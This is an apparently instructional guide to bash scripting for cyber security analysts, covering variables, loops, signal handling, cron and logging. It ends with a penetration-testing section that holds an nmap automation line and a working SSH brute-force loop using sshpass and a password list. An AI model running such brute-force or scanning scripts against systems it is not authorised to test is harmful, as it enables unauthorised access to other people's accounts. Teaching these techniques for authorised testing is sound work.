
# Shell Scripting for Cyber Security Analysts

Shell scripting is a vital tool for automating, securing, and managing systems. Below is a comprehensive guide from basic to advanced shell scripting concepts, covering key topics for cyber security analysts.

---

## **1. Basic Shell Scripting Concepts**

### **1.1 Shell Types**
There are several types of shells, but the most commonly used are:
- **Bourne Shell (sh)**: Basic shell.
- **Bash Shell (bash)**: Popular in Linux environments.
- **Z Shell (zsh)**: Similar to bash but with additional features.

```bash
#!/bin/bash
echo "Running shell: $SHELL"
```

### **1.2 Variables in Shell**
Variables store data values that can be reused.

```bash
#!/bin/bash
username="admin"
echo "Logged in as $username"
```

### **1.3 Input/Output Redirection**
Direct input and output of commands using redirection.

```bash
#!/bin/bash
# Output to a file
echo "Log this message" > logfile.txt
```

### **1.4 Pipes and Filters**
Pipes (`|`) are used to send the output of one command as input to another.

```bash
#!/bin/bash
# Pipe output from one command to another
cat file.txt | grep "error" | sort
```

---

## **2. Intermediate Shell Scripting**

### **2.1 Conditional Statements**

```bash
#!/bin/bash
# If-else condition
if [ -f "/etc/passwd" ]; then
    echo "File exists"
else
    echo "File does not exist"
fi
```

### **2.2 Loops**

#### **For loop**:
```bash
#!/bin/bash
for i in {1..5}; do
    echo "Iteration $i"
done
```

#### **While loop**:
```bash
#!/bin/bash
count=1
while [ $count -le 5 ]; do
    echo "Count: $count"
    count=$((count+1))
done
```

### **2.3 Functions**

```bash
#!/bin/bash
# Defining a function
greet() {
    echo "Hello, $1"
}
greet "Cyber Analyst"
```

---

## **3. Advanced Shell Scripting**

### **3.1 Process Management**
```bash
#!/bin/bash
# Start a background process
sleep 100 &
jobs
```

### **3.2 Signal Handling**
Handle interrupts like `SIGINT` (Ctrl+C).

```bash
#!/bin/bash
trap "echo 'Interrupt signal received'" SIGINT
while true; do
    echo "Press Ctrl+C to stop"
    sleep 1
done
```

### **3.3 File Manipulation**

```bash
#!/bin/bash
# Compressing files
tar -czf backup.tar.gz /path/to/directory
```

### **3.4 Regular Expressions with `sed` and `awk`**
```bash
# Using sed for replacing text
sed 's/oldtext/newtext/g' file.txt

# Using awk for text processing
awk '{print $1}' file.txt
```

---

## **4. Expert Shell Scripting Techniques**

### **4.1 Error Handling and Debugging**

```bash
#!/bin/bash
# Error handling
cp file1.txt file2.txt
if [ $? -eq 0 ]; then
    echo "Copy successful"
else
    echo "Copy failed"
fi

# Debugging mode
set -x
echo "This is a debugging example"
```

### **4.2 Scheduling Tasks with `cron`**

```bash
# Open crontab editor
crontab -e
# Add cron job to run daily at 3AM
0 3 * * * /path/to/script.sh
```

### **4.3 Security Scripting**

```bash
#!/bin/bash
# Generate a random password
openssl rand -base64 12
```

---

## **5. Best Practices in Shell Scripting**

### **5.1 Script Documentation**
```bash
#!/bin/bash
# Script purpose: This script performs X and Y
```

### **5.2 Error Logging**
```bash
#!/bin/bash
# Redirect errors to a log file
command 2> error.log
```

### **5.3 Security Considerations**
- Validate user inputs.
- Use full command paths (e.g., `/usr/bin/ls`).
- Limit script permissions for better security.

---

## **6. Shell Scripting in Penetration Testing**

### **6.1 Nmap Automation**
```bash
#!/bin/bash
# Automate Nmap scan
nmap -A 192.168.1.1 -oN scan_results.txt
```

### **6.2 Brute-Force Password Attempts**
```bash
#!/bin/bash
# Brute-force SSH login (for educational purposes only)
while read password; do
    if sshpass -p $password ssh user@target "exit"; then
        echo "Password found: $password"
        break
    fi
done < passwords.txt
```

---

Mastering shell scripting for cyber security not only enables task automation but also enhances incident handling, penetration testing, system hardening, and proactive security monitoring.
